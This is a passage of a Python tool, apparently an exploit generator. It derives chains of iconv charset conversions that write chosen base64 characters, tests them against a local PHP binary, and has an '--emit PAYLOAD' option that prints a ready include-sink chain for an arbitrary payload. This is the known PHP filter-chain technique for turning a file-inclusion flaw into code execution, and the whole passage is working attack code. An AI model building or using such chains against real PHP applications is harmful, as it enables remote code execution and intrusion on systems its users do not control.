    def _diverse():                     # full coverage AND cand_k gadgets each
        return len(table) >= 64 and all(len(v) >= cand_k for v in table.values())

    try:
        for depth in range(start_depth, max_depth + 1):
            if _diverse():
                break
            use_edges = edges_first if depth == 1 else edges   # permissive 1st
            per_depth = len(frontier) * len(use_edges)
            depth_cap = min(per_depth, max(0, budget - tested))
            if depth_cap <= 0:
                break
            gen = (seq + [e] for seq in frontier for e in use_edges)
            heap, counter = [], 0            # bounded top-frontier_cap by (i,len)
            t0 = last = time.time()
            done = prev_done = 0
            while done < depth_cap:
                take = min(SUPER, depth_cap - done)
                superb = list(itertools.islice(gen, take))
                if not superb:
                    break
                gads = [gad(s) for s in superb]
                if pool is not None:
                    chunk = max(1, len(gads) // (jobs * 8))
                    results = pool.map(_probe_daemon, gads, chunksize=chunk)
                else:
                    results = [_probe_daemon(g) for g in gads]
                for seq, (raw, sep) in zip(superb, results):
                    tested += 1
                    done += 1
                    c = accept(sep)
                    if c:                            # keep up to cand_k per char
                        lst = table.setdefault(c, [])
                        if len(lst) < cand_k and seq not in lst:
                            lst.append(seq)
                    if raw and raw not in seen:
                        vo = _valid(sep.decode("latin1"))
                        i = vo.find(vb)
                        if 0 <= i <= 3 and len(vo) <= len(vb) + 20:
                            seen.add(raw)
                            key = (-i, -len(raw), -counter)   # counter: unique
                            counter += 1
                            if len(heap) < frontier_cap:
                                heapq.heappush(heap, (key, seq))
                            elif key > heap[0][0]:
                                heapq.heapreplace(heap, (key, seq))
                now = time.time()
                if verbose and now - last >= 60:     # emit at most once a minute
                    inst = (done - prev_done) / (now - last) if now > last else 0
                    eta = (depth_cap - done) / inst if inst else 0
                    print(f"[*]   depth {depth}: {done}/{depth_cap} "
                          f"({100 * done / depth_cap:.0f}%) {inst:.0f}/s "
                          f"cov {len(table)}/64 eta {eta / 60:.1f}m", flush=True)
                    last, prev_done = now, done
                _save(table_out, table)              # periodic coverage snapshot
                if _diverse():                       # full coverage + diversity
                    break
            entries = [(-key[0], -key[1], -key[2], seq) for key, seq in heap]
            entries.sort(key=lambda x: (x[0], x[1], x[2]))
            frontier = [e[3] for e in entries]
            if verbose:
                rate = done / (time.time() - t0) if time.time() > t0 else 0
                mink = min((len(v) for v in table.values()), default=0)
                print(f"[*] depth {depth}: covered {len(table)}/64 "
                      f"(min {mink} gadgets/char), tested {tested}, "
                      f"frontier {len(frontier)}, {rate:.0f}/s", flush=True)
            _save(table_out, table)                  # snapshot at depth boundary
            _save(checkpoint, {"depth": depth, "tested": tested,
                               "table": table, "frontier": frontier})
            if _diverse() or tested >= budget or not frontier:
                break
    finally:
        if pool is not None:
            pool.close()
            pool.join()
        elif _DAEMON.get("p"):
            _DAEMON["p"].kill()
    missing = "".join(c for c in B64 if c not in table)
    return table, f"covered {len(table)}/64; missing: {missing or '(none)'}"


def selftest(php_bin="php", verbose=True):
    """Prove the seed primitive emits b'\\x1b$)C'."""
    dual = oracle_local_dual(php_bin)
    raw, _ = dual(SEED_PRIMITIVE)
    ok = raw == SEED_BYTES
    if verbose:
        print(f"[{'+' if ok else '-'}] seed '{SEED_PRIMITIVE}' -> {raw!r} "
              f"(expected {SEED_BYTES!r})")
    return ok


def _cli(argv):
    ap = argparse.ArgumentParser(
        description=__doc__.splitlines()[0],
        formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--php", default="php", help="local php binary for oracles")
    ap.add_argument("--selftest", action="store_true")
    ap.add_argument("--derive", action="store_true",
                    help="re-derive the table against a local same-version PHP")
    ap.add_argument("--charsets", help="comma list (default: curated ~120)")
    ap.add_argument("--depth", type=int, default=5)
    ap.add_argument("--budget", type=int, default=7_000_000)
    ap.add_argument("--jobs", type=int, default=1,
                    help="parallel oracle workers (0 = all CPUs); output is "
                         "identical to serial, just faster")
    ap.add_argument("--dedup", action="store_true",
                    help="collapse alias charsets with identical behaviour "
                         "before deriving (cuts edges on glibcs with many "
                         "aliases; stateful/wide encodings kept verbatim)")
    ap.add_argument("--table-out", help="write derived table JSON here")
    ap.add_argument("--table-in", help="load a derived table JSON (for --emit)")
    ap.add_argument("--checkpoint", help="state file: saved after each depth and "
                    "RESUMED from if it already exists")
    ap.add_argument("--candidates", type=int, default=8,
                    help="gadget candidates to keep per char (for the "
                         "composition-aware builder to pick/backtrack among)")
    ap.add_argument("--emit", metavar="PAYLOAD",
                    help="print an include-sink chain for PAYLOAD and exit")
    args = ap.parse_args(argv)

    if args.emit is not None:
        # primary candidates: the public composition-safe table (1 gadget/char);
        # alternates: our from-scratch derived gadgets, if a --table-in is given.
        table = {c: [g.split("|")] for c, g in PUBLIC_CONVERSIONS.items() if g}
        if args.table_in:
            derived = json.load(open(args.table_in))
            for c, lst in derived.items():
                seqs = lst if (lst and isinstance(lst[0], list)) else [lst]
                table.setdefault(c, []).extend(seqs)
        print(build_chain_validated(args.emit, table, php_bin=args.php,
                                     verbose=True))
        return 0
    rc = 0
    if args.selftest or not args.derive:
        rc = 0 if selftest(args.php) else 1
    if args.derive:
        cs = (args.charsets.split(",") if args.charsets
              else _default_charsets(args.php))
        jobs = args.jobs or (os.cpu_count() or 1)
        print(f"[*] {len(cs)} charsets -> {len(cs)*(len(cs)-1)} edges; "
              f"jobs={jobs}", flush=True)
        if args.dedup:
            cs = _dedup_charsets(cs, args.php, jobs=jobs)
            print(f"[*] {len(cs)} charsets -> {len(cs)*(len(cs)-1)} edges "
                  f"after dedup", flush=True)
        table, note = derive_table(oracle_local_dual(args.php), cs,
                                   max_depth=args.depth, budget=args.budget,
                                   jobs=jobs, php_bin=args.php,
                                   table_out=args.table_out,
                                   checkpoint=args.checkpoint,
                                   cand_k=args.candidates)
        print(f"[*] {note}")
        if args.table_out:
            json.dump({k: v for k, v in table.items()},
                      open(args.table_out, "w"))
            print(f"[*] wrote {args.table_out}")
    return rc


def _default_charsets(php_bin="php"):
    """A curated, non-redundant slice of `iconv -l` spanning the families the
    derivation needs (8859/CP/IBM/UTF-16/32/UCS/CJK/EBCDIC/ISO-2022)."""
    try:
        out = subprocess.run(["iconv", "-l"], capture_output=True, text=True,
                             timeout=10).stdout.split()
        have = {x.rstrip("/") for x in out}
    except (OSError, subprocess.SubprocessError):
        have = set()
    import re
    pat = re.compile(
        r"(8859|^L\d+$|^CP\d|^IBM|CSIBM|UTF-?16|UTF-?32|UCS-?[24]|^\d{3,4}$|"
        r"SHIFT|SJIS|JIS|GB|BIG5|EUC|JOHAB|KOI8|MAC|NAPLPS|SE2|UNICODE|10646|"
        r"ISO-IR|CSISO|ANSI_X3|GREEK|LATIN|CYRILLIC|HEBREW|ARABIC|CP125|CP10)",
        re.I)
    sel = sorted(c for c in have if pat.search(c)) if have else []
    return sel


if __name__ == "__main__":
    raise SystemExit(_cli(sys.argv[1:]))
